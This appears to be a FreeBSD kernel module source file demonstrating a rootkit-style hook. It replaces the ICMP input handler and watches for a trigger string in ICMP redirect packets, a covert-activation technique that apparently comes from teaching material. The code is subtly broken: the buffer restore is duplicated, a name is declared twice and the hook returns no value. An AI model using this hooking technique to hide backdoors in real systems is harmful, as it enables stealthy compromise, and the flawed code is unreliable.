#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>

#define TRIGGER "Shiny."

extern struct protosw inetsw[];
int icmp_input_hook;

/* icmp_input hook. */

int
icmp_input_hook(struct mbuf *m, int off){

	struct icmp *icp;
	int hlen = off;

	/* Locate the ICMP message within m. */
	m->m_len -= hlen;
	m->m_data += hlen;

	/* Extract the ICMP message. */
	icp = mtod(m, struct icmp *);

	/* Restore m. */
	m->m_len += hlen;
	m->m_data -= hlen;

	/* Restore m. */
	m->m_len += hlen;
	m->m_data -= hlen;

	/* Is this the ICMP message we are looking for? */
	if (icp->icmp_type == ICMP_REDIRECT && icp->icmp_code == ICMP_REDIRECT_TOSHOST && strncmp(icp->icmp_data, TRIGGER, 6) == 0)
		printf("Let's be bad guys.\n");
	else
		//icmp_input(&m, &off, 0);
		icmp_input(&m, &off, 0);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg){

	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		/* Replace icmp_input with icmp_input_hook. */
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
		break;
	
	case MOD_UNLOAD:
		/* Change everything back to normal. */
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static moduledata_t icmp_input_hook_mod = {
	"icmp_input_hook", 	/* module name */
	load,			/* event handler */
	NULL,			/* extra data */
};

DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
